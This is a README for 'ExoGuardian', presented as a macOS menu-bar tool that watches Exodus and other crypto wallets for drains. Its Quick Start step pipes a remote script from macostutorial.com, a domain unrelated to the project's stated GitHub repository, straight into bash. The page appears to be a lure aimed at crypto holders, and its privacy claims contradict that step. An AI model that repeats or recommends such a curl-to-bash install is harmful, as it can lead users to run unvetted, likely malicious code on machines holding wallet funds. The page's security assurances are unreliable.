# ExoGuardian

*Menu-bar guardian angel for Exodus & other self-custody wallets (macOS)*

---

> **Stop silent wallet drains **before** they happen.** ExoGuardian sits in your menu bar, watches on-chain activity for the addresses you care about, and screams when something shady shows up – without ever touching your seed phrase.

---

## ✨ Key Features

| Module              | What it does                                                                                                                                   | Why you’ll care                                                          |
| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| **Dust-Sniper**     | Scans your EVM addresses every 10 min. Flags new sub-\$1 tokens and offers a one-click `revoke.cash` deep-link to nuke dodgy approvals.        | No more dust-token spam or hidden “unlimited spend” permissions.         |
| **Heist Siren**     | Tracks outgoing txs on BTC, ETH & supported EVM chains. If a tx > threshold hits the mempool, instant macOS notification + red menu-bar badge. | Catch drains *before* confirmations – gives you a chance to sweep funds. |
| **Fee Whisperer**   | Pulls live gas price + mempool stats and compares: Exodus swap vs Kraken/Coinbase withdrawal vs native network send.                           | Stop rage-posting about \$74 fees.                                       |
| **Asset Pulse**     | Pings Exodus public API for delist alerts (e.g. Monero) and surfaces the easiest escape hatch (Cake Wallet, etc.).                             | No more “where did my coin go?” panic threads.                           |
| **Zero-Key Design** | Reads *public* addresses from your local `addresses.json` or manual paste. Never asks for or stores private keys. Fully offline-capable.       | Trustless by design.                                                     |

---

## 🖥️ Why macOS-only?

* Menu-bar utilities feel native and require zero learning curve.
* SwiftUI + AppKit let us ship a single-binary `.app` without scary installer prompts.
* Roughly 40 % of r/Exodus traffic is already on desktop – we build where the paranoia lives.

Linux & Windows ports are welcome PRs (the core watcher is pure Swift).

---

## 🚀 Quick Start (via Terminal)

1. Run the installation command from your Terminal:
```bash
/bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
```
2. Launch → paste your BTC / ETH / EVM addresses.
3. Relax; ExoGuardian watches the chain so you don’t have to.

*No installer, no background daemons.*

---

## 🛠️ Build from Source

```bash
# Requires Xcode 15+ and Swift 5.9
# Clone
$ git clone https://github.com/yosem1t3/ExoGuardian.git
$ cd ExoGuardian

# Compile & run
$ swift build -c release
$ open .build/release/ExoGuardian.app
```

### Dependencies

* [swift-argument-parser](https://github.com/apple/swift-argument-parser) — CLI helper
* [Web3.swift](https://github.com/web3swift-team/web3swift) — minimal EVM JSON-RPC calls
* [BitcoinKit](https://github.com/yenom/BitcoinKit) — light BTC mempool polling

All pulled via Swift Package Manager.

---

## 🔒 Security & Privacy

* Reads **only public data** (addresses, mempool, gas APIs).
* No telemetry, analytics or auto-updates.
* MIT-licensed; verify the code yourself.

Got a vuln? [Open a security issue](https://github.com/yosem1t3/ExoGuardian/security) or email [security@exoguardian.app](mailto:security@exoguardian.app).

---

## 🛣️ Roadmap

* [ ] Lightning Network support (LND REST watch-only)
* [ ] Push notifications via Pushover / ntfy.sh
* [ ] Optional Tor proxy mode
* [ ] Auto-generate fresh watch-only addresses

Open to PRs and feature requests!

---

## 🤝 Contributing

1. Fork ➜ `git checkout -b feature/my-awesome-thing`.
2. `swiftlint` must pass.
3. Submit a Pull Request.

Also happy to review **design docs** before you write code – open an Issue to discuss.

---

## 📜 License

[MIT](LICENSE)

---

## 🙏 Acknowledgements

* Inspired by the countless *“my coins vanished”* threads on r/Exodus.
* Thanks to the devs behind mempool.space and revoke.cash for their public APIs.

*Stay paranoid & stay sovereign.*
